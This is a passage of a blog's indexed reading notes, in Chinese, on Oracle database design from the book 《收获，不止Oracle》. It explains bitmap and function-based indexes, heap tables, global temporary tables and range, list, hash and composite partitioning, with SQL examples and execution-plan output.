位图索引非常适合于数据仓库环境中的大量读取操作，因为它能够非常高效地处理选择查询。\n位图索引的工作原理：位图索引使用一系列位图来表示数据表中的行。对于每一个不同的值，位图索引都会创建一个位图。位图中的每一位对应数据表中的一行记录，如果该行具有相应的值，则对应的位被设置为1；否则，位被设置为0。\n优点：\n\n位图索引非常节省空间，因为只存储0和1，每个值只占用1位。\n非常适合范围查询和过滤操作。可以通过位运算快速找到匹配的行。\n适合数据仓库中的复杂的、批处理式的查询。\n\n缺点：\n\n更新的成本高。低基数的列意味着包含同一值有大量的行，因此更新的影响很大。会导致锁等问题，影响并发。\n不适合高基数的列。对于具有大量不同值的列，位图索引会变得非常大且效率低下。\n对于较小的表，位图索引可能不会带来显著的性能提升，反而会增加额外的管理开销。\n\nCOUNT(*)的性能，在非空列有BTREE索引的情况下，一般用到该索引性能远高于全表扫描。不过性能最高的却是列上有位图索引的情况，甚至比用到普通非空列的BTREE索引时的性能又高出一大截。另外，位图索引可以存储空值。\n位图索引的适合场景要满足两个条件：1. 位图索引列大量重复 2. 该表极少更新\n函数索引对索引列做运算导致索引无法使用。比如 select * from table_name where upper(field_name) = &#39;T&#39;;当必须要对索引列做函数运算时，可以创建函数索引。\ncreate index index_name on table_name(upper(field_name)); 创建函数索引。\n函数索引（Function-Based Index）是一种特殊的索引类型，它允许在数据库中创建基于表达式或函数计算结果的索引。函数索引可以提高某些查询的性能，特别是在查询条件中包含复杂的表达式或函数时。函数索引索的引键是基于表达式的结果，而不是表中的原始列值。当查询包含与函数索引表达式相同的表达式时，Oracle可以使用该索引来加速查询。这可以避免在查询执行时重复计算表达式。\n函数索引的性能介于普通索引和全表扫描之间。因此，能用普通索引就用普通索引。尽量避免列运算。\n","categories":["读书笔记"],"tags":["数据库","《收获，不止Oracle》","Oracle"]},{"title":"《收获，不止Oracle》读书笔记上篇-表设计","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8A%E6%94%B6%E8%8E%B7%EF%BC%8C%E4%B8%8D%E6%AD%A2Oracle%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%8A%E7%AF%87-%E8%A1%A8%E8%AE%BE%E8%AE%A1/","content":"第四章 - 祝贺，表设计成就英雄\n普通堆表：适合大部分设计场景，有优点也有缺点，需要和其他表设计取长补短。 \n优点：语法简单方便、适用大部分场景\n缺点：表更新日志开销较大、Delete无法释放空间、表记录太大检索较慢、素引回表读开销很大、即便有序插入，也难以有序读出\n\n\n全局临时表：适合接口表设计\n优点：高效删除、产生日志少、不同SESSION独立，不产生锁\n缺点：语法特别、数据无法得到有效的保护\n\n\n分区表：适合日志表\n优点：有效的分区消除、高效的记录清理、高效的记录转移\n缺点：语法复杂、分区过多对系统有一定的影响\n\n\n索引组织表：适合极少更新的配置表\n优点：表就是索引，可以避免回表、语法复杂\n缺点：更新开销牧大\n\n\n簇表：适合使用频繁关联查询的多表\n优点：可以减少或避免排序\n缺点：语法复杂、表更新开销大\n\n\n\n每个人都有每个人的特点和优势，要善于发掘和利用，才可以把事情做好。不同的表也一样，有的适用于这个应用场景，却不适合另外一个场景，要学会选择性地使用技术。技术其实并不难，最难的是如何选择。 这一章主要就是在强调什么场合该选什么技术。没有高级的技术，只有最合适的技术。\n普通堆表不足之处表更新日志开销较大下面的脚本是利用 v$statname 和 v$mystat 两个动态性能视图来跟踪当前SESSION操作产生的日志量.使用方法很简单：首次先执行该脚本，查看日志大小，随即执行你的更新语句，再执行该脚本返回的日志大小，两者相减，就是你此次更新语句产生的日志大小。\n-- 查看产生多少日志select a.name, b.valuefrom v$statname a,     v$mystat bwhere a.statistic# = b.statistic#  and a.name = &#x27;redo size&#x27;;\n\n-- 赋权grant all on v_$statname to TEST_USER;grant all on v_$mystat to TEST_USER;-- 以下创建视图，方便后续直接用 select * from v_redo_size 进行查询create or replace view v_redo_size asselect a.name, b.valuefrom v$statname a,     v$mystat bwhere a.statistic# = b.statistic#  and a.name = &#x27;redo size&#x27;;\n\n下面观察各个更新操作产生的日志量。\nSQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                               600SQL&gt; delete from t;70927 rows deleted.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                           1152708SQL&gt; insert into t select OBJECT_ID from dba_objects;71191 rows created.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                           2262512SQL&gt; update t set id = rownum;71191 rows updated.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                          13080536\n\n删除操作产生了 1152708 - 600 &#x3D; 1146708 字节，大约1.09M 的日志。插入操作产生了 2262512 - 1152708 &#x3D; 1109804 字节，大约1.06M 的日志。更新操作产生了 13080536 - 2262512 &#x3D; 10818024 字节，大约10.32M 的日志。\n无论是删除、插入还是修改，都会产生日志。前面体系结构中讲过这些日志是用于数据库的备份和恢复的。如果仅从性能角度而不从安全性角度来考虑，更新表写日志就意味着数据库多做了额外的事情而影响了效率，虽说安全第一，不过在某些特定的场合，某些表的记录只是作为中间结果临时运算而根本无须永久保留，这些表无须写日志，那就既高效又安全了！这就是后续会说的全局临时表。\nDelete无法释放空间使用 delete from t 删除表，前后查询所产生的逻辑读次数是相同的。只有使用 truncate table t 清空表，才能显著减少逻辑读次数。显然，delete删除并不能释放空间，虽然delete将很多块的记录删除了，但是空块依然保留，Oracle在查询时依然会去查询这些空块。而truncate是一种释放高水平位的动作，这些空块被回收，空间也就释放了。\n不过truncate显然不能替代delete，因为truncate是一种DDL操作而非DML操作，truncate后面是不能带条件的，truncate table t where…是不允许的。但是如果表中这些where条件能形成有效的分区，Oracle是支持在分区表中做truncate分区的，命令大致为 alter table t truncate partition &#39;分区名&#39;。如果where条件就是分区条件，那等同于换角度实现了truncate table t where…的功能。这就是分区表最实用的功能之一了，高效地清理数据，释放空间。\n此外，当大量delete删除再大量insert插入时，Oracle会去这些delete的空块中首先完成插入（直接路径插入除外），所以频繁delete又频繁insert的应用，是不会出现空块过多的情况的。\n表记录太大检索较慢一张表其实就是一个SEGMENT，一般情况下我们都需要遍历该SEGMENT的所有BLOCK来完成对该表进行更新查询等操作，在这种情况下，表越大，更新查询操作就越慢。有没有什么好方法能提升检索的速度呢？主要思路就是缩短访问路径来完成同样的更新查询操作，简单地说就是完成同样的需求访问BLOCK的个数越少越好。Oracle为了尽可能减少访问路径提供了两种主要技术，一种是索引技术，另一种则是分区技术。\n以 select * from t where insert_time &gt; xxxx and insert_time &lt; xxxx 为例，如果id是主键，那么Oracle会直接通过索引找到对应的BLOCK，然后直接读取该BLOCK中的记录。\n首先说索引，这是Oracle中最重要也是最实用的技术之一。在本例中，如果 insert_time &gt; xxxx and insert_time &lt; xxxx 返回的记录非常少，或者说T表的总记录相比非常少，则在 insert_time 列建索引能极大提升该语句的效率。比如建了一个 t_id_index 的索引，在该SQL查询时首先会访问 t_id_index 这个新建出来的索引段，然后通过索引段和表段的映射关系，迅速从表中获取行列的信息并返回结果。具体细节后续索引部分细说。索引本身也是一把双刃剑，既能给数据库开发应用带来极大的帮助，也会给数据库带来不小的灾难。\n减少访问路径的第二种技术就是分区技术，把普通表T表改造为分区表，比如以 insert_time 这个时间列为分区字段，比如从 2020年1月到2023年12月按月建36个分区。早先的T表就一个T段，现在情况变化了，从1个大段分解成了36个小段，分别存储了2010年1月到2012年12月的信息，此时假如 insert_time &gt; xxxx and insert_time &lt; xxxx 这个时间跨度正好是落在2020年11月，那Oracle的检索就只要完成一个小段的遍历即可。假设这36个小段比较均匀，我们就可以大致理解为访问量只有原来的三十六分之一，大幅度减少了访问路径，从而高效地提升了性能。\n索引回表读开销很大观察下面例子中，TABLE ACCESS BY INDEX ROWID BATCHED 的开销。\nL&gt; drop table t purge;Table dropped.SQL&gt; create table t as select * from dba_objects where ROWNUM &lt;= 200;Table created.SQL&gt; create index t_object_id_index on t(object_id);Index created.SQL&gt; set linesize 1000SQL&gt; set autotrace traceonlySQL&gt; select * from t where object_id &lt;= 10;9 rows selected.Execution Plan----------------------------------------------------------Plan hash value: 632031452---------------------------------------------------------------------------------------------------------| Id  | Operation                           | Name              | Rows  | Bytes | Cost (%CPU)| Time     |---------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT                    |                   |     9 |   963 |     2   (0)| 00:00:01 ||   1 |  TABLE ACCESS BY INDEX ROWID BATCHED| T                 |     9 |   963 |     2   (0)| 00:00:01 ||*  2 |   INDEX RANGE SCAN                  | T_OBJECT_ID_INDEX |     9 |       |     1   (0)| 00:00:01 |---------------------------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   2 - access(&quot;OBJECT_ID&quot;&lt;=10)Statistics----------------------------------------------------------       1316  recursive calls          0  db block gets       1620  consistent gets        135  physical reads          0  redo size       4319  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client         96  sorts (memory)          0  sorts (disk)          9  rows processed\n\n一般来说，根据索引来检索记录，会有一个先从索引中找到记录，再根据索引列上的 ROWID 定位到表中从而返回索引列以外的其他列的动作，这就是TABLE ACCESS BY INDEX ROWID。下面观察如果消除 TABLE ACCESS BY INDEX ROWID BATCHED 的开销。\nSQL&gt; select object_id from t where object_id &lt;= 10;9 rows selected.Execution Plan----------------------------------------------------------Plan hash value: 3023054428--------------------------------------------------------------------------------------| Id  | Operation        | Name              | Rows  | Bytes | Cost (%CPU)| Time     |--------------------------------------------------------------------------------------|   0 | SELECT STATEMENT |                   |     9 |    36 |     1   (0)| 00:00:01 ||*  1 |  INDEX RANGE SCAN| T_OBJECT_ID_INDEX |     9 |    36 |     1   (0)| 00:00:01 |--------------------------------------------------------------------------------------Predicate Information (identified by operation id):---------------------------------------------------   1 - access(&quot;OBJECT_ID&quot;&lt;=10)Statistics----------------------------------------------------------       1262  recursive calls          0  db block gets       1484  consistent gets        151  physical reads          0  redo size        697  bytes sent via SQL*Net to client        108  bytes received via SQL*Net from client          2  SQL*Net roundtrips to/from client         96  sorts (memory)          0  sorts (disk)          9  rows processed\n\n这里没有 TABLE ACCESS BY INDEX ROWID 了。因为语句从 select * from t where object_id &lt;= 10; 改写为 select object_id from t where object_id &lt;= 10; 了，不用从索引中回到表中获取索引列以外的其他列了。性能上，逻辑读从1620变为1484，代价从2变为1。（每次执行前都清空了共享池和缓存）避免回表从而使性能提升这是一个很简单的道理，少做事性能当然提升了。只是 select * from t 和 select object_id from t毕竞不等价，有没有什么方法可以实现写法依然是 select * from t 但是还是可以不回表呢？普通表是做不到的，能实现这种功能的只有索引组织表。\n有序插入却难以有序读出在对普通表的操作中，我们无法保证在有序插入的前提下就能有序读出。最简单的一个理由就是，如果把行记录插入块中，然后删除了该行，接下来插入的行会去填补块中的空余部分，这就无法保证有序了。所以在查询数据时，如果想有序地展现，就必须使用order by，否则根本不能保证顺序展现，而order by操作是开销很大的操作。\nSQL&gt; select object_id from t;200 rows selected.Execution Plan----------------------------------------------------------Plan hash value: 1601196873--------------------------------------------------------------------------| Id  | Operation         | Name | Rows  | Bytes | Cost (%CPU)| Time     |--------------------------------------------------------------------------|   0 | SELECT STATEMENT  |      |   200 |   800 |     3   (0)| 00:00:01 ||   1 |  TABLE ACCESS FULL| T    |   200 |   800 |     3   (0)| 00:00:01 |--------------------------------------------------------------------------Statistics----------------------------------------------------------          1  recursive calls          0  db block gets         20  consistent gets          4  physical reads          0  redo size       4228  bytes sent via SQL*Net to client        433  bytes received via SQL*Net from client         15  SQL*Net roundtrips to/from client          0  sorts (memory)          0  sorts (disk)        200  rows processedSQL&gt; select object_id from t order by OBJECT_ID desc;200 rows selected.Execution Plan----------------------------------------------------------Plan hash value: 961378228---------------------------------------------------------------------------| Id  | Operation          | Name | Rows  | Bytes | Cost (%CPU)| Time     |---------------------------------------------------------------------------|   0 | SELECT STATEMENT   |      |   200 |   800 |     4  (25)| 00:00:01 ||   1 |  SORT ORDER BY     |      |   200 |   800 |     4  (25)| 00:00:01 ||   2 |   TABLE ACCESS FULL| T    |   200 |   800 |     3   (0)| 00:00:01 |---------------------------------------------------------------------------Statistics----------------------------------------------------------         50  recursive calls          6  db block gets         46  consistent gets          1  physical reads       1008  redo size       4228  bytes sent via SQL*Net to client        433  bytes received via SQL*Net from client         15  SQL*Net roundtrips to/from client          3  sorts (memory)          0  sorts (disk)        200  rows processed\n\n可以观察到，有排序的操作的统计信息模块有个 3 sorts(memory)，表示发生了排序，执行计划中也有SORT ORDER BY的关键字。不过最重要的是，没排序的操作代价为3，有排序的操作代价为4，性能上是有差异的，在大数量时将会非常明显。关于order by避免排序的方法有两种思路。第一种思路是在order by的排序列建索引，至于为什么，还是留着后续索引部分细说。第二种方法就是，将普通表改造为有序散列聚簇表，这样可以保证顺序插入，order by展现时无须再有排序动作。\n奇特的全局临时表从数据安全性来看，对表记录的操作写日志是不可避免的，否则备份恢复就无从谈起了，只是现实中真的有一部分应用对表的某些操作是不需要恢复的，比如运算过程中临时处理的中间结果集，这时就可以考虑用全局临时表来实现。\n全局临时表的类型全局临时表分为两种类型，一种是**基于会话的全局临时表(commit preserve rows)，一种是基于事务的全局临时表(on commit delete rows)**。\n-- 创建基于会话的全局临时表drop table t_tmp_session purge;create global temporary table T_TMP_session on commit preserve rows as select * from dba_objects where 1 = 2;select table_name, temporary, duration from user_tables where table_name = &#x27;T_TMP_SESSION&#x27;;-- 创建基于事务的全局临时表drop table t_tmp_transaction purge;create global temporary table t_tmp_transaction on commit delete rows as select * from dba_objects where 1 = 2;select table_name, temporary, DURATION from user_tables where table_name = &#x27;T_TMP_TRANSACTION&#x27;;\n\n观察各类DML的REDO日志量SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                             43504SQL&gt; insert into T_TMP_session select * from dba_objects;71208 rows created.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                            605748-- 基于会话的全局临时表，插入数据时产生了 605748 - 43504 = 562244 ，约0.54MBSQL&gt; insert into t_tmp_transaction select * from dba_objects;71208 rows created.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                           1167932-- 基于事务的全局临时表，插入数据时产生了 1167932 - 605748 = 562184 ，约0.54MBSQL&gt; update T_TMP_session set object_id = rownum;71208 rows updated.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                           6850608-- 基于会话的全局临时表，更新数据时产生了 6850608 - 1167932 = 5682676 ，约5.42MBSQL&gt; update t_tmp_transaction set object_id = rownum;71208 rows updated.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                          11516184-- 基于事务的全局临时表，更新数据时产生了 11516184 - 6850608 = 4665576 ，约4.45MBSQL&gt; delete from T_TMP_session;71208 rows deleted.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                          23298188-- 基于会话的全局临时表，删除数据时产生了 23298188 - 11516184 = 11782004 ，约11.24MBSQL&gt; delete from t_tmp_transaction;71208 rows deleted.SQL&gt; select * from v_redo_size;NAME                                                                  VALUE---------------------------------------------------------------- ----------redo size                                                          35080104-- 基于事务的全局临时表，删除数据时产生了 35080104 - 23298188 = 11781916 ，约11.24MB\n\n可以发现全局临时表，无论插入，修改还是删除，都还是要写日志。只是无论插入更新还是删除，操作普通表产生的日志都比全局临时表要多。具体比较就省略了，比较语句上基本没有差别。\n全局临时表两大特性全局临时表最重要的特点有两个。\n\n高效删除记录，基于事务的全局临时表COMMIT或者SESSION连接退出后，临时表记录自动删除；基于会话的全局临时表则是SESSION连接退出后，临时表记录自动删除，都无须手动去操作。\n针对不同会话数据独立，不同的SESSION访问全局临时表，看到的结果不同。\n\n高效删除记录基于事务的全局临时表COMMIT后，记录会被删除。另外，用C0MMT方式删除全局临时表记录所产生的日志量才很小，比起直接用delete方式操作产生的日志量，几乎可以忽略不计了。这点日志其实还是是COMMIT动作本身产生的，所以基本可以理解为全局临时表的COMMIT或者退出SESSION的方式不会产生日志。\nSQL&gt; insert into t_tmp_transaction select * from dba_objects;71208 rows created.SQL&gt; select count(1) from t_tmp_transaction;  COUNT(1)----------     71208SQL&gt; commit;Commit complete.SQL&gt; select count(1) from t_tmp_transaction;  COUNT(1)----------         0\n\n基于会话的全局临时表SESSION退出后，记录会被删除。\n一般来说，基于SESSION的全局临时表的应用会更多一些，少数比较复杂的应用，涉及一次调用中需要记录清空再插入等复杂动作时，才考虑用基于事务的全局临时表。\n不同会话独立即每个session会话中查询到的全局临时表数据是相互独立的，相互隔离、互不干扰。\n-- 查询当前会话信息select * from v$mystat where ROWNUM = 1;\n\n神通广大的分区表在如今数据量日益增长的海量数据库时代，分区表技术显得尤为重要，甚至可以说使用得当与否将决定到系统的生死。关于普通堆表的不足，其中表记录太大检索慢和delete删除有瑕疵这两个缺点正好可以被分区表的分区消除和可以高效清理分区数据这两大特点给弥补了。\n什么叫分区消除，最通俗的比喻就是，对某表按月份建了范围分区，从1月到12月共12个分区，你查询当前12月的记录，就不会去访问另外11个区，少做事了，这就是分区消除。高效分区清理呢，就是如果要删除某分区的数据，如果直接delete，速度很慢，而且高水平位也不会释放，查询的块依然很多，这时可以直接truncate这个分区，速度非常快。\n在这个Google的时代，语法和知识点都不是问题，搜不到的是体系，是重点，是思想。上面是书中的原话，这里还想说的就是。时代在进步，如今AI的时代，获取知识更加容易。但无论什么时代，都要善于利用工具。\n分区表类型及原理首先探讨的是分区表的类型及原理。分区表的类型有范围分区、列表分区、HA$H分区及组合分区4种。其中范围分区应用最为广泛，需要重点学习和掌握，而列表分区次之，在某些场合下也可以考虑使用组合分区，相对而言HASH分区在应用中适用的场景并不广泛，使用的频率比较低。\noracle分区表的使用和查询\n范围分区范围分区最常见的是按时间列进行分区。\n-- 创建范围分区表create table range_part_tab(    id        number,    deal_date date,    area_code number,    contents  varchar2(4000))    partition by range (deal_date)(    partition p1 values less than (TO_DATE(&#x27;2024-02-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p2 values less than (TO_DATE(&#x27;2024-03-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p3 values less than (TO_DATE(&#x27;2024-04-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p4 values less than (TO_DATE(&#x27;2024-05-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p5 values less than (TO_DATE(&#x27;2024-06-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p6 values less than (TO_DATE(&#x27;2024-07-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p7 values less than (TO_DATE(&#x27;2024-08-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p8 values less than (TO_DATE(&#x27;2024-09-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p9 values less than (TO_DATE(&#x27;2024-10-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p10 values less than (TO_DATE(&#x27;2024-11-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p11 values less than (TO_DATE(&#x27;2024-12-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p12 values less than (TO_DATE(&#x27;2025-01-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),    partition p_max values less than (maxvalue))-- 插入一整年随机日期和591-599之间的随机数。共100000条数据insert into range_part_tab(id, deal_date, area_code, contents)select rownum,       to_date(to_char(sysdate - 365, &#x27;J&#x27;) + TRUNC(DBMS_RANDOM.VALUE(0, 365)), &#x27;J&#x27;),       ceil(dbms_random.value(590, 599)),       rpad(&#x27;*&#x27;, 400, &#x27;*&#x27;)from dualconnect by rownum &lt;= 100000;\n\n\n范围分区的关键字为 partition by range ，即这三个关键字表示该分区为范围分区。后面为范围的字段。\nvalues less than 是范围分区特定的语法，用于指明具体的范围，比如partition p3 values less than (TO_DATE(&#39;2024-04-01&#39;, &#39;YYYY-MM-DD&#39;))，表示小于3月份的记录。partition p1到partition pmax 表示总共建立了13个分区。最后还要注意partition p_max values less than (maxvalue)的部分，表示超出这些范围的记录全部落在这个分区中，包括空值，免得出错。\n分区表的分区可分别指定在不同的表空间里，如果不写即为都在同一默认表空间里。如果将每个分区保存到单独的表空间中，这样数据文件就可以跨越多个物理磁盘。\n\n列表分区列表分区的特点是某列的值只有几个，基于这样的特点我们可以采用列表分区。创建一个按字段数据列表固定可枚举值分区的表。插入记录分区字段的值必须在列表中，否则不能被插入。\n-- 创建列表分区表create table list_part_tab(    id        number,    deal_date date,    area_code number,    contents  varchar2(4000))    partition by list (area_code)(    partition p_591 values (591),    partition p_592 values (592),    partition p_593 values (593),    partition p_594 values (594),    partition p_595 values (595),    partition p_596 values (596),    partition p_597 values (597),    partition p_598 values (598),    partition p_599 values (599),    partition p_other values (DEFAULT))\n\n\n列表分区的关键字为partition by list，即这三个关键字表示该分区为列表分区。\n不同于之前范围分区的values less than，列表分区仅需values即可确定范围，值得注意的是，partition p592 values(592)并不是说明取值只能写一个，也可写为多个，比如partition p_union values (592,593,594)。\npartition p_591到partition p_other表示总共建立了10个分区。\npartition p_other values(default)，表示不在刚才591到S99范围的记录全部落在这个默认分区中，包括空值，避免应用出错。\n分区表的分区可分别指定在不同的表空间里，如果不写即为都在同一默认表空间里。\n\n散列分区（Hash分区）hash分区最主要的机制是根据hash算法来计算具体某条纪录应该插入到哪个分区中，hash算法中最重要的是hash函数，Oracle中如果你要使用hash分区，只需指定分区的数量即可。建议分区的数量采用2的n次方，这样可以使得各个分区间数据分布更加均匀。\n-- 创建hash分区表create table hash_part_tab(    id        number,    deal_date date,    area_code number,    contents  varchar2(4000))    partition by hash (deal_date)    PARTITIONS 16;\n\n\n散列分区的关键字为partition by hash，出现这三个关键字即表示当前分区为散列分区。\n散列分区与之前两种分区的明显差别在于：没有指定分区名，而仅仅是指定了分区个数，如PARTITIONS 16。\n散列分区的分区数量采用2的n次方，这样可以使得各个分区间数据分布更加均匀。\n可以指定散列分区的分区表空间，比如增加如下一小段，STORE IN(ts1,ts2,ts3,ts4,ts5,ts6,ts7,ts8,ts9,ts10,ts11,ts12,ts13,ts14,ts15,ts16)表示分别存在在12个不同的表空间里，当然不写出表空间就是都在同一默认表空间里。\n\n组合分区组合分区结合了两种或多种不同的分区方法，如范围分区（Range Partitioning）、列表分区（List Partitioning）和散列分区（Hash Partitioning）。通过组合使用这些方法，可以实现更高效的查询性能和更好的数据管理。\n基于范围分区和列表分区，表首先按某列进行范围分区，然后再按某列进行列表分区，分区之中的分区被称为子分区。基于范围分区和散列分区，表首先按某列进行范围分区，然后再按某列进行散列分区。以此类推，其实就是分区中的分区。\n-- 创建基于范围和列表的组合分区表CREATE TABLE range_list_part_tab(    id        number,    deal_date date,    area_code number,    contents  varchar2(4000))    partition by range (deal_date) -- 第一级分区：按年份范围分区    SUBPARTITION by list (area_code) -- 第二级分区：按地区编号列表分区(    PARTITION rlp1 VALUES LESS THAN (TO_DATE(&#x27;2024-06-01&#x27;, &#x27;YYYY-MM-DD&#x27;))        (        subpartition rlp1_595 values (595),        subpartition rlp1_other values (DEFAULT)        ),    partition rlp2 values less than (maxvalue)        (        subpartition rlp2_595 values (595),        subpartition rlp2_other values (DEFAULT)        ))-- 简化CREATE TABLE range_list_part_tab(  id        number,  deal_date date,  area_code number,  contents  varchar2(4000))  partition by range (deal_date) -- 第一级分区：按年份范围分区  SUBPARTITION by list (area_code) -- 第二级分区：按地区编号列表分区  subpartition template(  subpartition p_591 values (591),  subpartition p_592 values (592),  subpartition p_593 values (593),  subpartition p_594 values (594),  subpartition p_595 values (595),  subpartition p_596 values (596),  subpartition p_597 values (597),  subpartition p_598 values (598),  subpartition p_599 values (599),  subpartition p_other values (DEFAULT))(  partition p1 values less than (TO_DATE(&#x27;2024-02-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p2 values less than (TO_DATE(&#x27;2024-03-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p3 values less than (TO_DATE(&#x27;2024-04-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p4 values less than (TO_DATE(&#x27;2024-05-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p5 values less than (TO_DATE(&#x27;2024-06-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p6 values less than (TO_DATE(&#x27;2024-07-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p7 values less than (TO_DATE(&#x27;2024-08-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p8 values less than (TO_DATE(&#x27;2024-09-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p9 values less than (TO_DATE(&#x27;2024-10-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p10 values less than (TO_DATE(&#x27;2024-11-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p11 values less than (TO_DATE(&#x27;2024-12-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p12 values less than (TO_DATE(&#x27;2025-01-01&#x27;, &#x27;YYYY-MM-DD&#x27;)),  partition p_max values less than (maxvalue));\n\n\n组合分区是由主分区和从分区组成的，比如范围列表分区，就表示主分区是范围分区，而从分区是列表分区，从分区的关键字为subpartition,比如本例中的subpartition by list (area_code)。\n为了避免在每个主分区中都写相同的从分区，可以考虑用模版方式，比如简化中的subpartition TEMPLATE关键字。\n只要涉及子分区模块，都需要有subpartition关键字。\n关于表空间和之前的没有差别，依然是可以指定，也可以不指定。\n\n分区原理-- 创建普通表作为对照create table norm_tab(id number,deal_date date,area_code number,contents varchar2(4000));insert into norm_tab(id, deal_date, area_code, contents)select rownum,       to_date(to_char(sysdate - 365, &#x27;J&#x27;) + TRUNC(DBMS_RANDOM.VALUE(0, 365)), &#x27;J&#x27;),       ceil(dbms_random.value(590, 599)),       rpad(&#x27;*&#x27;, 400, &#x27;*&#x27;)from dualconnect by rownum &lt; 100000;\n\n比较普通表与分区表在段分配上的差异\nSQL&gt; set linesize 1000SQL&gt; set pagesize 5000SQL&gt; column segment_name format a20SQL&gt; column partition_name format a20SQL&gt; column segment_type format a20SQL&gt; select segment_name,partition_name,segment_type,bytes/1024/1024,tablespace_name from user_segments where segment_name IN(&#x27;RANGE_PART_TAB&#x27;,&#x27;NORM_TAB&#x27;);SEGMENT_NAME         PARTITION_NAME       SEGMENT_TYPE         BYTES/1024/1024 TABLESPACE_NAME-------------------- -------------------- -------------------- --------------- ------------------------------RANGE_PART_TAB       P1                   TABLE PARTITION                   23 SYSTEMRANGE_PART_TAB       P4                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P3                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P7                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P6                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P2                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P5                   TABLE PARTITION                    4 SYSTEMRANGE_PART_TAB       P8                   TABLE PARTITION                .1875 SYSTEMNORM_TAB                                  TABLE                             46 SYSTEM9 rows selected.\n\n分区表会产生多个SEGMENT，而且是建了几个分区就有几个SEGMENT，而普通表仅有一个SEGMENT。分区表一个很简单的思想：化整为零，将大对象切割成多个小对象，从而使得在指定的小对象中定位到数据成为一种可能，最终达到减少访问路径，尽量少做事就能解决问题的目的。\nHASH分区表无法让指定的数据到指定的分区去，这对快速检索数据并不是很有利，因此HASH分区在实际的工作中应用得相对较少一些。不过任何事情存在即合理，HASH分区会用在什么场合呢？其实HASH分区最大的好处在于，将数据根据一定HASH算法，均匀分布到不同的分区中去，避免查询数据时集中在某一个地方，从而避免热点块的竞争，改善IO。此外，HASH可以精确匹配，无法范围扫描。现实中我们可以针对某些本身就无法有效执行分区范围的列进行HASH分区，比如ID列之类的，在出现热点块竞争严重时，可考虑如此设计。\n组合分区的分区数量比起非组合分区会多很多。比如上面创建的range_list_part_tab表，有130个分区。组合分区存在的意义，就是化整为零思想的升级版，将一个大对象切割得更细更小了。这对于一个超级大表来说，也是有一定的意义的。不过分区表也是有额外开销的，如果分区数量过多，Oracle就需要管理过多的段，在操作分区表时也容易引发Oracle内部大量的递归调用，此外本身的语法也有一定的复杂度。所以一般来说，只有大表才建议建分区，记录数在100万以下的表，基本上不建议建分区。\n分区表最实用的特性高效的分区清除分区表存在最大的意义就在于，可以有效地做到分区消除，比如你对地区号做了分区，查询福州就只会在福州的分区中查找数据，而不会到厦门、漳州、泉州等其他分区中查找，这就是分区消除，消除了福州以外的所有其他分区。原理很简单，就是因为分区表其实是将一个大对象分成了多个小对象，通过分区的规则，可以确定数据在哪个或哪几个小对象中，从而减少访问路径。\n比较相同语句，普通表无法用到 DEAL_DATE 条件进行分区消除的情况。\nSQL&gt; select * from range_part_tab where deal_date &gt;= TO_DATE(&#x27;2024-02-04&#x27;, &#x27;YYYY-MM-DD&#x27;) and deal_date &lt; TO_DATE(&#x27;2024-02-07&#x27;, &#x27;YYYY-MM-DD&#x27;);853 rows selected.Elapsed: 00:00:00.16Execution Plan----------------------------------------------------------Plan hash value: 16125146---------------------------------------------------------------------------------------------------------| Id  | Operation              | Name           | Rows  | Bytes | Cost (%CPU)| Time     | Pstart| Pstop |---------------------------------------------------------------------------------------------------------|   0 | SELECT STATEMENT       |                |   832 |  1655K|   129   (0)| 00:00:01 |       |       ||   1 |  PARTITION RANGE SINGLE|                |   832 |  1655K|   129   (0)| 00:00:01 |     2 |     2 ||*  2 |   TABLE ACCESS FULL    | RANGE_PART_TAB |   832 |  1655K|   129   (0)| 00:00:01 |     2 